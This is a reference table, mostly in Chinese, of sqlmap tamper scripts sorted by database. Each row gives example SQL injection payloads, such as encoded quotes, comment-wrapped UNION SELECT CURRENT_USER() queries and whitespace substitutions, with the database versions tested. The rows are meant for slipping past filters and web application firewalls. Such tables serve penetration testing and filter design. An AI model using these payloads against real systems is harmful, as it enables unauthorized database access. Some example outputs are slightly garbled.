支持的数据库,编号,脚本名称,作用,实现方式,测试通过的数据库类型和版本,,
ALL,1,"apostrophemask.py
",把 单引号' 替换为 utf8全宽度等价物  (即 ' 替换为 %EF%BC%87) ,"(""1 AND '1'='1"") 
'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'",,,
,2,base64encode.py,把 全部payload字符 替换为 它们经过base64编码后的字符  原文:Base64-encodes all characters in a given payload ,"(""1' AND SLEEP(5)#"")
'MScgQU5EIFNMRUVQKDUpIw=='",,,
,3,multiplespaces.py,SQL关键字字符串的前后 添加多个空格   原文"Adds multiple spaces (' ') around SQL keywords ,"('1 UNION SELECT foobar')
'1    UNION     SELECT   foobar'",,,
,4,space2plus.py,把 空格 替换为 + ,"('SELECT id FROM users')
'SELECT+id+FROM+users'
",,,
,5,nonrecursivereplacement.py(sqlmap 1.3.1.25中已删除该脚本),"把 SQL关键字字符串 替换为 对应的两次重复字符串（例如某网站只进行一次 将SQL关键字SELECT替换为空 而不是递归替换SQL关键字 所以这个网站可用该脚本进行注入 该脚本适用于非常弱的自定义过滤器","('1 UNION SELECT 2--')
'1 UNIOUNIONN SELESELECTCT 2--'",,,
,6,space2randomblank.py,"代替空格字符（“”）从一个随机的空
白字符可选字符的有效集","('SELECT id FROM users')
'SELECT%0Did%0DFROM%0Ausers'",,,
,7,unionalltounion.py,替换UNION ALL SELECT UNION SELECT,"('-1 UNION ALL SELECT')
'-1 UNION SELECT'",,,
,8,securesphere.py,追加特制的字符串,"('1 AND 1=1')
""1 AND 1=1 and '0having'='0having'""",,,
MSSQL,1,space2hash.py,把 空格 替换为 符号#(即%23) 跟 一个随机字符串 再跟 一个\n(即%0A),"'1 AND 9227=9227' 
'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'",,,
,2,"equaltolike.py
","把 = 替换为 like
","* Input: SELECT * FROM users WHERE id=1 
2 * Output: SELECT * FROM users WHERE id LIKE 1",,,
,3,space2mssqlblank.py(mssql),空格替换为其它空符号,"Input: SELECT id FROM users
Output: SELECT%08id%02FROM%0Fusers","* Microsoft SQL Server 2000
* Microsoft SQL Server 2005",,
,4,space2mssqlhash.py,替换空格,"('1 AND 9227=9227')
'1%23%0AAND%23%0A9227=9227'",,,
,5,between.py,用between替换大于号（>）,"('1 AND A > B--')
'1 AND A NOT BETWEEN 0 AND B--'",,,
,6,percentage.py,asp允许每个字符前面添加一个%号,"* Input: SELECT FIELD FROM TABLE
* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

",,,
,7,sp_password.py,追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾,"('1 AND 9227=9227-- ')
'1 AND 9227=9227-- sp_password'",,,
,8,charencode.py,url编码,"* Input: SELECT FIELD FROM%20TABLE
* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45",,,
,9,randomcase.py,随机大小写,"* Input: INSERT
* Output: InsERt
",,,
,10,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′",,,
,11,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
* Output: SELECT//id//FROM/**/users
",,,
MYSQL,1,"equaltolike.py
","like 代替等号
","* Input: SELECT * FROM users WHERE id=1 
2 * Output: SELECT * FROM users WHERE id LIKE 1","Microsoft SQL Server 2005

MySQL 4, 5.0 and 5.5",,
,2,greatest.py,"绕过过滤’>’ ,用GREATEST替换大于号。","('1 AND A > B')
'1 AND GREATEST(A,B+1)=A'","* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,3,apostrophenullencode.py,绕过过滤双引号，替换字符和双引号。,"tamper(""1 AND '1'='1"")

'1 AND %00%271%00%27=%00%271'","* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,4,ifnull2ifisnull.py,"绕过对 IFNULL 过滤。
替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’","('IFNULL(1, 2)')
'IF(ISNULL(1),2,1)'",* MySQL 5.0 and 5.5,,
,5,space2mssqlhash.py,替换空格,"('1 AND 9227=9227')
'1%23%0AAND%23%0A9227=9227'",,,
,6,modsecurityversioned.py,过滤空格，包含完整的查询版本注释,"('1 AND 2>1--')
'1 /*!30874AND 2>1*/--'",* MySQL 5.0,,
,7,space2mysqlblank.py,空格替换其它空白符号(mysql),"Input: SELECT id FROM users
Output: SELECT%0Bid%0BFROM%A0users",* MySQL 5.1,,
,8,between.py,用between替换大于号（>）,"('1 AND A > B--')
'1 AND A NOT BETWEEN 0 AND B--'","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,9,modsecurityzeroversioned.py,包含了完整的查询与零版本注释,"('1 AND 2>1--')
'1 /*!00000AND 2>1*/--'",* MySQL 5.0,,
,10,space2mysqldash.py,替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）,"('1 AND 9227=9227')
'1--%0AAND--%0A9227=9227'",,,
,11,bluecoat.py,"代替空格字符后与一个有效的随机空白字符的SQL语句。
然后替换=为like","('SELECT id FROM users where id = 1')
'SELECT%09id FROM users where id LIKE 1'","* MySQL 5.1, SGOS",,
,12,percentage.py,asp允许每个字符前面添加一个%号,"* Input: SELECT FIELD FROM TABLE
* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

","* Microsoft SQL Server 2000, 2005
* MySQL 5.1.56, 5.5.11
* PostgreSQL 9.0",,
,13,charencode.py,url编码,"* Input: SELECT FIELD FROM%20TABLE
* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,14,randomcase.py,随机大小写,"* Input: INSERT
* Output: InsERt
","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,15,versionedkeywords.py,Encloses each non-function keyword with versioned MySQL comment,"* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#
* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#",,,
,16,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
* Output: SELECT//id//FROM/**/users
","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,17,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′","* Microsoft SQL Server 2000
* Microsoft SQL Server 2005
* MySQL 5.1.56
* PostgreSQL 9.0.3",,
,18,versionedmorekeywords.py,注释绕过,"* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#",,,
* MySQL < 5.1,19,halfversionedmorekeywords.py,关键字前加注释,"* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa
* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa","* MySQL 4.0.18, 5.0.22",,
,20,halfversionedmorekeywords.py,"当数据库为mysql时绕过防火墙，每个关键字之前添加
mysql版本注释","1.(""value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa"")
2.""value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa""","* MySQL 4.0.18, 5.0.22",,
MySQL >= 5.1.13,21,space2morehash.py,空格替换为 #号 以及更多随机字符串 换行符,"* Input: 1 AND 9227=9227
* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227",MySQL 5.1.41,,
 Oracle,1,greatest.py,"绕过过滤’>’ ,用GREATEST替换大于号。","('1 AND A > B')
'1 AND GREATEST(A,B+1)=A'","* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,2,apostrophenullencode.py,绕过过滤双引号，替换字符和双引号。,"tamper(""1 AND '1'='1"")

'1 AND %00%271%00%27=%00%271'","* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,3,between.py,用between替换大于号（>）,"('1 AND A > B--')
'1 AND A NOT BETWEEN 0 AND B--'","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,4,charencode.py,url编码,"* Input: SELECT FIELD FROM%20TABLE
* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,5,randomcase.py,随机大小写,"* Input: INSERT
* Output: InsERt
","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,6,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′","* Microsoft SQL Server 2000
* Microsoft SQL Server 2005
* MySQL 5.1.56
* PostgreSQL 9.0.3",,
,7,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
* Output: SELECT//id//FROM/**/users
","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
 PostgreSQL,1,greatest.py,"绕过过滤’>’ ,用GREATEST替换大于号。","('1 AND A > B')
'1 AND GREATEST(A,B+1)=A'","* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,2,apostrophenullencode.py,绕过过滤双引号，替换字符和双引号。,"tamper(""1 AND '1'='1"")

'1 AND %00%271%00%27=%00%271'","* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,3,between.py,用between替换大于号（>）,"('1 AND A > B--')
'1 AND A NOT BETWEEN 0 AND B--'","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,4,percentage.py,asp允许每个字符前面添加一个%号,"* Input: SELECT FIELD FROM TABLE
* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E

","* Microsoft SQL Server 2000, 2005
* MySQL 5.1.56, 5.5.11
* PostgreSQL 9.0",,
,5,charencode.py,url编码,"* Input: SELECT FIELD FROM%20TABLE
* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,6,randomcase.py,随机大小写,"* Input: INSERT
* Output: InsERt
","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
,7,charunicodeencode.py,字符串 unicode 编码,"* Input: SELECT FIELD%20FROM TABLE
* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′","* Microsoft SQL Server 2000
* Microsoft SQL Server 2005
* MySQL 5.1.56
* PostgreSQL 9.0.3",,
,8,space2comment.py,Replaces space character (‘ ‘) with comments ‘/**/’,"* Input: SELECT id FROM users
* Output: SELECT//id//FROM/**/users
","* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0",,
Microsoft Access,1,appendnullbyte.py,在有效负荷结束位置加载零字节字符编码,"('1 AND 1=1')
'1 AND 1=1%00'",,,
其他,,chardoubleencode.py,双url编码(不处理以编码的),"* Input: SELECT FIELD FROM%20TABLE
* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545",,,
,,unmagicquotes.py,宽字符绕过 GPC  addslashes,"* Input: 1′ AND 1=1
* Output: 1%bf%27 AND 1=1–%20",,,
,,randomcomments.py,用/**/分割sql关键字,"‘INSERT’ becomes ‘IN//S//ERT’
",,,
